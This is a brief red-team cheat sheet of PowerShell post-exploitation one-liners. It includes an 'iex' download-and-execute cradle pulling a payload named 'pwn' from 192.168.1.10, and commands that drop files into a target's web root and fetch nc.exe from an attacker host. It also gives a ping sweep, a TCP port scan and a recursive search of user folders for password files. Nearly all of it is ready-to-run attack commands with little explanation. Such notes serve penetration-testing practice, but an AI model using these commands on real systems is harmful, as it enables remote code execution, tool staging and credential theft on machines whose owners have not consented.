**Powershell For Red Team**
===========================


**Tools**
--------
Source: <a href='http://www.powershellempire.com/' target='_blank'>powershellempire</a> 
Source: <a href='https://github.com/PowerShellMafia/PowerSploit' target='_blank'>PowerSploit</a> 

PowerShell for Pen-Tester Post-Exploitation
---------
can download and execute  with minimize the length with Invoke-Expression  the alias is "iex"
Invoke-Expression (iex) runs commands passed to it Net.WebCline acts as PowerShell Web browser

```bash
$ powershell.exe -nop -c “iex(new-object Net.WebClient).DownloadString(‘https://192.168.1.10/pwn’)”
```
You can download your file from your external Server and than save it at traget machine

```bash
$ powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://www.mydomain.cloud/test.txt','C:\inetpub\wwwroot\test.ps1')
```

**Conduct a ping sweep:**
```
PS C:\> 1..255 | % {echo "10.10.10.$_";ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}
```

**Conduct a port scan:**
```
PS C:\> 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("192.168.1.10",$_)) "Port $_ is open!"} 2>$null
```

**Fetch a file via HTTP (wget in PowerShell):**
```
PS C:\> (New-Object System.Net.WebClient).DownloadFile("http://192.168.1.10/nc.exe","nc.exe")
```
**Find all files with a particular name:**
```
PS C:\> Get-ChildItem "C:\Users\" -recurse -include *passwords*.txt
```
